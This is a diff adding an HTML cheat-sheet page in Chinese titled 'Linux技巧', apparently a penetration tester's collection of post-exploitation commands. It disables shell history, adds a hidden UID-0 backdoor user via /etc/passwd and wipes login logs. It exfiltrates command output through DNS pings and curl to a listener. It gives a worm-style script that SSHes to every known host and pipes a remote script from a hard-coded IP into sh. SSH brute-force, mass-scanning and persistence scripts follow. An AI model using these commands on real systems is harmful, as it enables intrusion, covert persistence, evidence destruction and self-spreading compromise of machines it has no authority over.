@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Linux技巧 - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "title: Linux\u6280\u5de7 date: 2022-04-21 17:26:31", url: "#_top", children: [
+          ]},
+          {title: "\u767b\u5f55\u540e\u4e0d\u8bb0\u5f55\u547d\u4ee4", url: "#_1", children: [
+          ]},
+          {title: "\u6dfb\u52a0\u4e00\u4e2aroot\u7528\u6237", url: "#root", children: [
+          ]},
+          {title: "\u4e00\u6761\u547d\u4ee4\u4fee\u6539\u7528\u6237\u5bc6\u7801", url: "#_2", children: [
+          ]},
+          {title: "\u547d\u4ee4\u957f\u7ed3\u679c\u56de\u663e\u5916\u5e26", url: "#_3", children: [
+          ]},
+          {title: "\u81ea\u542f\u52a8", url: "#_4", children: [
+          ]},
+          {title: "\u6e05\u9664\u5386\u53f2\u8bb0\u5f55", url: "#_5", children: [
+          ]},
+          {title: "\u641c\u7d22\u81ea\u5b9a\u4e49\u6587\u4ef6\u5e76\u6253\u5305", url: "#_6", children: [
+          ]},
+          {title: "\u81ea\u52a8\u67e5\u627e\u516c\u94a5\u81ea\u52a8\u6a2a\u5411", url: "#_7", children: [
+          ]},
+          {title: "\u7528nc\u542f\u52a8\u4e00\u4e2aweb\u76d1\u542c\u5668", url: "#ncweb", children: [
+          ]},
+          {title: "\u5404\u79cdawk\u547d\u4ee4", url: "#awk", children: [
+          ]},
+          {title: "\u8ba1\u5212\u4efb\u52a1", url: "#_8", children: [
+          ]},
+          {title: "Curl", url: "#curl", children: [
+          ]},
+          {title: "nc", url: "#nc", children: [
+          ]},
+          {title: "\u6b63\u5219", url: "#_9", children: [
+          ]},
+          {title: "\u5176\u4ed6\u811a\u672c", url: "#_10", children: [
+              {title: "\u4f7f\u7528ssh\u6279\u91cf\u6267\u884c\u547d\u4ee4", url: "#ssh" },
+              {title: "js\u5f00\u542f\u4e00\u4e2aweb\u76d1\u542c\u5668-\u89e3\u7801base64", url: "#jsweb-base64" },
+              {title: "js\u5f00\u542f\u4e00\u4e2aweb\u76d1\u542c\u5668", url: "#jsweb" },
+              {title: "\u4f7f\u7528NC\u5f00\u542f\u4e00\u4e2aweb\u76d1\u542c\u5668", url: "#ncweb_1" },
+              {title: "nmap\u6307\u5b9a\u7ea7\u522b\u6279\u91cf\u626b\u63cf", url: "#nmap" },
+              {title: "\u5185\u7f51\u7f51\u5173\u63a2\u6d4b\u811a\u672c", url: "#_11" },
+          ]},
+          {title: "\u65e0\u8fde\u63a5\u75d5\u8ff9", url: "#_12", children: [
+          ]},
+          {title: "\u590d\u5236\u6307\u5b9a\u6587\u4ef6\u5e76\u6253\u5305", url: "#_13", children: [
+          ]},
+          {title: "\u4ea4\u4e92\u5f0fshell", url: "#shell", children: [
+          ]},
+          {title: "\u8fdb\u7a0b\u5b88\u62a4\u811a\u672c", url: "#_14", children: [
+          ]},
+          {title: "\u540e\u53f0\u8fd0\u884c\u7684\u7a0b\u5e8f\u9000\u51fassh\u540e\u4f1a\u81ea\u52a8kill", url: "#sshkill", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../MSF%E5%91%BD%E4%BB%A4/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../MSF%E5%91%BD%E4%BB%A4/" class="btn btn-xs btn-link">
+        MSF命令
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-link">
+        Exchange攻击面
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h3 id="title-linux-date-2022-04-21-172631">title: Linux技巧 date: 2022-04-21 17:26:31</h3>
+<h2 id="_1">登录后不记录命令</h2>
+<p>登陆后运行，更绝一点可以直接写入basrc里</p>
+<pre><code class="language-text-plain">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
+export HISTFILE=/dev/null
+export HISTSIZE=0
+export HISTFILESIZ
+</code></pre>
+<h2 id="root">添加一个root用户</h2>
+<pre><code class="language-text-plain">useradd system;echo 'system:123456' | chpasswd
+
+echo &quot;system:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd
+
+ssh -T username@host /bin/bash -i
+90
+</code></pre>
+<h2 id="_2">一条命令修改用户密码</h2>
+<pre><code class="language-text-plain">echo &quot;密码&quot; | passwd --stdin 用户名
+
+举例：
+
+[root@Bserver ~]# echo &quot;skyzheng&quot; | passwd --stdin test     #把test这个用户的密码改为skyzheng
+
+changing password for user test
+
+passwd: all authentication tokens updated successfully.   #代码密码修改成功
+
+echo &quot;1qaz@WSX&quot; | passwd --stdin root
+</code></pre>
+<h2 id="_3">命令长结果回显外带</h2>
+<pre><code class="language-text-plain">以ifconfig这个多行输出的为例，使用awk进行逐行读取，截取指定行的指定字段
+'ip=`ifconfig| awk NR==2 | awk '{print substr($0,1,40)}' | base64 -w 0` &amp;&amp; ping $ip.acc.ceye.io'
+
+查找文件结果回显
+先把查找记录保存为文件
+find / -name passwd 2&gt;/dev/null &gt; /tmp/1 
+再逐行读取
+'file=`cat /tmp/1 awk NR==1 | awk '{print substr($0,1,20)}' | base64 -w 0` &amp;&amp; ping $file.acc.ceye.io'
+
+配合ladon的web服务
+
+curl http://192.168.156.1:800/deb64/`ls -l | base64 | tr '\n' '-'`
+
+whois -h 192.168.156.1 -p 800 `ifconfig | base64`
+</code></pre>
+<h2 id="_4">自启动</h2>
+<pre><code class="language-text-plain">将写好的脚本（.sh文件）放到目录 /etc/profile.d/ 下，系统启动后就会自动执行该目录下的所有shell脚本
+
+还可以修改开机启动文件：/etc/rc.local（或者/etc/rc.d/rc.local）
+
+复制代码
+# 1.编辑rc.local文件
+[root@localhost ~]# vi /etc/rc.local
+
+# 2.修改rc.local文件，在 exit 0 前面加入以下命令。保存并退出。
+/etc/init.d/mysqld start                                         # mysql开机启动
+/etc/init.d/nginx start                                          # nginx开机启动
+supervisord -c /etc/supervisor/supervisord.conf                  # supervisord开机启动
+/bin/bash /server/scripts/test.sh &gt;/dev/null 2&gt;/dev/null
+
+# 3.最后修改rc.local文件的执行权限
+[root@localhost ~]# chmod +x  /etc/rc.local
+[root@localhost ~]# chmod 755 /etc/rc.local
+</code></pre>
+<h2 id="_5">清除历史记录</h2>
+<pre><code class="language-text-plain">echo &gt; /var/log/secure
+echo &gt; /var/log/wtmp
+echo &gt; /var/log/btmp
+echo &gt; /var/log/lastlog
+echo &gt; /root/.bash_history
+history -c 
+</code></pre>
+<h2 id="_6">搜索自定义文件并打包</h2>
+<p><code>find /home/ -name '*.' | xargs tar cvf /tmp/gqrd.tgz</code></p>
+<h2 id="_7">自动查找公钥自动横向</h2>
+<pre><code class="language-text-plain">#!/bin/bash
+
+
+if [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then
+  for h in $(grep -oE &quot;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&quot; /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl http://1.177.165.231/sd/T3llyz.sh|sh || wget -q -O- http://1.177.165.231/sd/T3llyz.sh)|sh &gt;/dev/null 2&gt;&amp;1 &amp;' &amp; done
+fi
+
+for file in /home/*
+do
+    if test -d $file
+    then
+        if [ -f $file/.ssh/known_hosts ] &amp;&amp; [ -f $file/.ssh/id_rsa.pub ]; then
+            for h in $(grep -oE &quot;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&quot; $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl http://1.177.165.231/sd/T3llyz.sh|sh || wget -q -O- http://1.177.165.231/sd/T3llyz.sh)|sh &gt;/dev/null 2&gt;&amp;1 &amp;' &amp; done
+        fi
+    fi
+done
+
+
+抄了一下挖矿蠕虫的代码，用于出网探测或其他情况
+修改命令即可用，后面跟了sh &gt;/dev/null 2&gt;&amp;1 表示标准输出和错误输出都不显示，最后的&amp;代表后台运行
+</code></pre>
+<h2 id="ncweb">用nc启动一个web监听器</h2>
+<pre><code class="language-text-plain">while true;
+do (
+echo -e 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin:*\r\n';
+echo -e &quot;{\&quot;code\&quot;:\&quot;0\&quot;,\&quot;data\&quot;:{\&quot;success\&quot;:true}}\n&quot;
+) | nc -lp 9527; done
+</code></pre>
+<h2 id="awk">各种awk命令</h2>
+<p>对文件内容按行批量追加字符 <code>cat mail.txt| awk '{print "qian:" $0 ":hou"}'</code></p>
+<h2 id="_8">计划任务</h2>
+<pre><code class="language-text-plain">每一分钟执行一次 /bin/ls：
+
+* * * * * /bin/ls
+
+
+实例1：每1分钟执行一次command
+命令：
+* * * * * command
+实例2：每小时的第3和第15分钟执行
+命令：
+3,15 * * * * command
+实例3：在上午8点到11点的第3和第15分钟执行
+命令：
+3,15 8-11 * * * command
+实例4：每隔两天的上午8点到11点的第3和第15分钟执行
+命令：
+3,15 8-11 */2 * * command
+实例5：每个星期一的上午8点到11点的第3和第15分钟执行
+命令：
+3,15 8-11 * * 1 command
+实例6：每晚的21:30重启smb 
+命令：
+30 21 * * * /etc/init.d/smb restart
+
+
+实例7：每月1、10、22日的4 : 45重启smb 
+命令：
+45 4 1,10,22 * * /etc/init.d/smb restart
+
+
+实例8：每周六、周日的1 : 10重启smb
+命令：
+10 1 * * 6,0 /etc/init.d/smb restart
+
+
+实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb 
+命令：
+0,30 18-23 * * * /etc/init.d/smb restart
+
+
+实例10：每星期六的晚上11 : 00 pm重启smb 
+命令：
+0 23 * * 6 /etc/init.d/smb restart
+
+
+实例11：每一小时重启smb 
+命令：
+* */1 * * * /etc/init.d/smb restart
+
+
+实例12：晚上11点到早上7点之间，每隔一小时重启smb 
+命令：
+* 23-7/1 * * * /etc/init.d/smb restart
+实例13：每月的4号与每周一到周三的11点重启smb 
+命令：
+0 11 4 * mon-wed /etc/init.d/smb restart
+实例14：一月一号的4点重启smb 
+命令：
+0 4 1 jan * /etc/init.d/smb restart
+
+
+实例15：每小时执行/etc/cron.hourly目录内的脚本
+命令：
+01 * * * * root run-parts /etc/cron.hourly
+说明：
+run-parts这个参数了，如果去掉这个参数的话，后面就可以写要运行的某个脚本名，而不是目录名了
+</code></pre>
+<h2 id="curl">Curl</h2>
+<p>提交文件</p>
+<p><code>curl -F "imgFIle=@xx.html" url</code></p>
+<h2 id="nc">nc</h2>
+<p><code>-l</code> port 侦听模式，不指定端口时会默认选择一个端口 <code>-s</code> 指定发送数据的源ip <code>-u</code> 使用udp，默认tcp <code>-v</code> 输出信息 <code>-w</code> 超时秒数 <code>-z</code> 扫描，不发送数据</p>
+<p>监听 <code>nc -lv 6666</code></p>
+<p>扫描 <code>nc -zvw 3 1.1.1.1 6666</code></p>
+<p>传输 接收端 <code>nc -l 6666 &lt; 我是文件.txt</code> 发送端 <code>nc -l 6666 &gt; 我是文件.txt</code> 扫描端口 <code>nc -znv 1.1.1.1 1-65535</code></p>
+<p><code>nc -v -w 1.1.1.1 -z 1-1000</code></p>
+<p>Linux语法</p>
+<p><code>for i in {67}; do nc -vv -n -w 1 1.1.1.$i 8000 8010 8080 8081 80 443 -z; done</code></p>
+<p>Windows语法 <code>for /l %i in (2,1,100) do nc -znv 10.9.7.%i 8000 8010 8080 8081 80 443</code></p>
+<h2 id="_9">正则</h2>
+<pre><code class="language-text-plain">IPv4 地址 
+(?=(\b|\D))(((\d{1,2})|(1\d{1,2})|(2[0-4]\d)|(25[0-5]))\.){3}((\d{1,2})|(1\d{1,2})|(2[0-4]\d)|(25[0-5]))(?=(\b|\D))
+((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)
+IPv6 地址
+^([\\da-fA-F]{1,4}:){7}([\\da-fA-F]{1,4})$
+
+
+\s+ 表示1个以上空字符串 
+\d    任何一位数字  \d{3} 进行三次匹配
+由于正则表达式中含有\ ，斜杠需要用\转义，为了简便，需要在字符串前面用r'\d{3}' 标记
+说明字符串是原始字符串。
+\D    非数字字符
+\w    字母数字下划线
+\W    非字母数字下划线
+\s     空白字符
+\S    非空白字符
+？    表示匹配1次或0次   
+*    表示匹配0次或任意次
++    表示匹配1次或任意次
+    (x){3} 表示匹配特定次，{3,5}指定3次到5次，{,3}0次到3次，{3,}3次到多次。指定？表示非贪心匹配
+^    方括号后表示非；字符开始处表示起始
+%    字符尾部表示结束
+.    表示换行外的所有字符，只匹配1个字符
+</code></pre>
+<h2 id="_10">其他脚本</h2>
+<h3 id="ssh">使用ssh批量执行命令</h3>
+<pre><code class="language-text-plain"># -*- coding: utf-8 -*-
+# @Time    : 2019-02-26 15:09
+# @Author  : 00theway
+# @File    : brute_ssh.py
+# @Software: PyCharm
+
+import paramiko, time
+import threading
+from queue import Queue
+import socket
+
+
+class Brute_ssh(threading.Thread):
+    def __init__(self, ips, users, command):
+        threading.Thread.__init__(self)
+        self.ips = ips
+        self.command = command
+        self.users = users
+
+    def run(self):
+        print('thread start', threading.currentThread().name)
+        while not self.ips.empty():
+            ip = self.ips.get()
+            for username,password in self.users:
+                try:
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    try:
+                        ssh.connect(ip, 22, username, password=password, timeout=60)
+
+                        print('connect %s %s:%s success' % (ip, username, password))
+                        time.sleep(1)
+                        stdin, stdout, stderr = ssh.exec_command(command)
+                        out = ''.join(stdout.readlines())
+                        print(ip, out)
+                        open(ip + '.txt', 'a+').write(out)
+                    except:
+                        print('connect %s failed' % ip)
+
+                    ssh.close()
+                except Exception as e:
+                    print(e)
+        print('thread end', threading.currentThread().name)
+
+if __name__ == '__main__':
+
+    #command = 'ping -c 1 10.1.1.1'
+    command = 'ping -c 1 10.1.1.1'
+    #command = 'ping -c 1 10.1.1.1'
+
+    users = [
+        ('lifepay','lifepay'),
+        #('root','P@ssw0rd'),
+        #('oracle','oracle'),
+        #('weblogic','weblogic')
+    ]
+    ips = '''
+10.1.1.1
+10.1.1.2
+    '''
+
+    deploy_pools = []
+    ips_q = Queue()
+
+    for item in ips.splitlines():
+        ips_q.put(item)
+    #
+    # for i in range(255):
+    #     ip = '10.194.172.%s' % i
+    #     ips.put((ip, '22'))
+
+    for _ in range(5):
+        deploy_pools.append(Brute_ssh(ips_q, users, command))
+
+    for worker in deploy_pools:
+        worker.start()
+
+    for worker in deploy_pools:
+        worker.join()
+</code></pre>
+<h3 id="jsweb-base64">js开启一个web监听器-解码base64</h3>
+<p>对监听到的base64数据进行解码</p>
+<pre><code class="language-text-plain">var http = require('http');
+var querystring = require('querystring');
+http.createServer(function (req, res) {
+        var body = '';
+        var bbase64=req.url
+        rbase64 = bbase64.substring(1)
+        var base64ToStr = new Buffer(rbase64 , 'base64').toString();
+
+        console.log('req.url:',base64ToStr);
+        req.on('data', function (chunk) {
+        body += chunk;
+            console.log(&quot;chunk:&quot;,chunk);
+        });
+        req.on('end', function () {
+            body = querystring.parse(body);  
+            console.log('body:',body);
+            res.write('Message from server');
+            res.end();
+        });
+}).listen(800,'0.0.0.0');
+</code></pre>
+<h3 id="jsweb">js开启一个web监听器</h3>
+<p>不解码直接返回原始数据</p>
+<pre><code class="language-text-plain">var http = require('http');
+var querystring = require('querystring');
+http.createServer(function (req, res) {
+        var body = '';
+        //var bbase64=req.url
+        //rbase64 = bbase64.substring(1)
+        //var base64ToStr = new Buffer(rbase64 , 'base64').toString();
+
+        //console.log('req.url:',base64ToStr);
+        console.log('req.url:',body);
+        req.on('data', function (chunk) {
+        body += chunk;
+            console.log(&quot;chunk:&quot;,chunk);
+        });
+        req.on('end', function () {
+            body = querystring.parse(body);  
+            console.log('body:',body);
+            res.write('Message from server');
+            res.end();
+        });
+}).listen(800,'0.0.0.0');
+</code></pre>
+<h3 id="ncweb_1">使用NC开启一个web监听器</h3>
+<pre><code class="language-text-plain">while true;
+do (
+echo -e 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin:*\r\n';
+echo -e &quot;{\&quot;code\&quot;:\&quot;0\&quot;,\&quot;data\&quot;:{\&quot;success\&quot;:true}}\n&quot;
+) | nc -lp 9527; done
+</code></pre>
+<h3 id="nmap">nmap指定级别批量扫描</h3>
+<pre><code class="language-text-plain">#!/bin/bash
+bak=$IFS
+if [ $# -ne 1 ];then
+    echo &quot;Usage $0 IPfile&quot;
+    exit
+fi
+if [ ! -f $1 ];then
+    echo &quot;the $1 is not a file&quot;
+    exit
+fi
+echo -n &quot;speed 0-5 : &quot;
+read s
+IFS=$'\n'
+for i in `cat $1`
+do
+    nmap -PA -PS -P0 -sS $i -r -T $s -p1-65535 --open
+done
+IFS=$bak
+</code></pre>
+<h3 id="_11">内网网关探测脚本</h3>
+<pre><code class="language-text-plain">a段
+
+#!/bin/bash
+
+net=10
+for k in {0..255}
+do
+    for j in {0..255}
+    do
+        for i in 1 254;
+        do
+            ping -c 1 -w 1 $net.$k.$j.$i | grep &quot;ttl=&quot; &gt;/dev/null 2&gt;&amp;1
+            if [ $? -eq 0 ];then
+                echo $net.$k.$j.$i is alive ! || &gt;&gt; ascan.txt
+            else
+                echo $net.$k.$j.$i May be not exist !
+            fi
+        done
+    done
+done
+
+
+b段
+#!/bin/bash
+
+net=192.168
+for j in {0..255}
+do
+  for i in 1 254;
+  do
+    ping -c 1 -w 1 $net.$j.$i | grep &quot;ttl=&quot; &gt;/dev/null 2&gt;&amp;1
+    if [ $? -eq 0 ];then
+      echo $net.$j.$i is alive ! || &gt;&gt; bscan.txt
+    else
+      echo $net.$j.$i May be not exist !
+    fi
+  done
+done
+
+
+c段
+#!/bin/bash
+
+net=192.168.148
+for j in {0..255}
+do
+    ping -c 1 -w 1 $net.$j | grep &quot;ttl=&quot; &gt;/dev/null 2&gt;&amp;1
+    if [ $? -eq 0 ];then
+      echo $net.$j is alive ! || &gt;&gt; cscan.txt
+    else
+      echo $net.$j May be not exist !
+    fi
+done
+</code></pre>
+<h2 id="_12">无连接痕迹</h2>
+<pre><code class="language-text-plain">ssh -o UserKnownHostsFile=/dev/null -T root@10.1.1.1 /bin/bash -i
+</code></pre>
+<h2 id="_13">复制指定文件并打包</h2>
+<p><code>find /web -name *.jsp | xargs tar cvf /tmp/web.tar</code></p>
+<p><code>find /home/JavaProjects/1234/ -name '*.jsp' | xargs tar cvf /tmp/1234.tgz</code></p>
+<h2 id="shell">交互式shell</h2>
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'  
+ctrl + z  
+stty raw -echo;fg
+</code></pre>
+<h2 id="_14">进程守护脚本</h2>
+<pre><code>#!/bin/bash
+
+
+process_name=&quot;javawc&quot;
+
+
+restart_command=&quot;nohup /tmp/javawc run --config 1.json &gt; /dev/null 2&gt;&amp;1 &amp;&quot;
+
+while true; do
+  if pgrep -x &quot;$process_name&quot; &gt;/dev/null; then
+    sleep 1
+  else
+    eval &quot;$restart_command&quot;
+    echo &quot;Process '$process_name' has been restarted.&quot;
+  fi
+done
+
+
+</code></pre>
+<h2 id="sshkill">后台运行的程序退出ssh后会自动kill</h2>
+<p>不管怎么后台运行，不管用什么命令，只要退出ssh会话进程就kill。
+解决方法：登录ssh后先<code>su 用户名</code> ，再运行程序就不会kill了。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../MSF%E5%91%BD%E4%BB%A4/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../MSF%E5%91%BD%E4%BB%A4/" class="btn btn-xs btn-link">
+        MSF命令
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-link">
+        Exchange攻击面
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
